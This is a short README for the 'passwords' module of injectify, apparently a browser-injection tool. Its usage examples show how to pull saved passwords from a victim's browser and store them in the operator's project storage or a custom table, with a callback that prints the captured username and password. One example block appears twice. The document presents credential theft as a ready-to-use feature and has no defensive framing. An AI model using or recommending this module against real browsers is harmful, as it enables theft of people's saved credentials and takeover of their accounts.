## `passwords` module

Extracts saved passwords from the browser and records them to your project's data Storage

## Usage

```js
// Simply extract and record
injectify.module('passwords')
// { username: 'user123', password: 'p@$$w0rd' }


// Record passwords to a custom table
injectify.module('passwords', {
  table: 'customTable'
})
// { username: 'user123', password: 'p@$$w0rd' }


// Record passwords to a custom table
injectify.module('passwords', {
  table: 'customTable'
})
// { username: 'user123', password: 'p@$$w0rd' }


// Callback once they've been extracted
injectify.module('passwords').then(({ username, password }) => {
  console.log(`Your username is ${username} and your password is ${password}`)
})
// { username: 'user123', password: 'p@$$w0rd' }
```
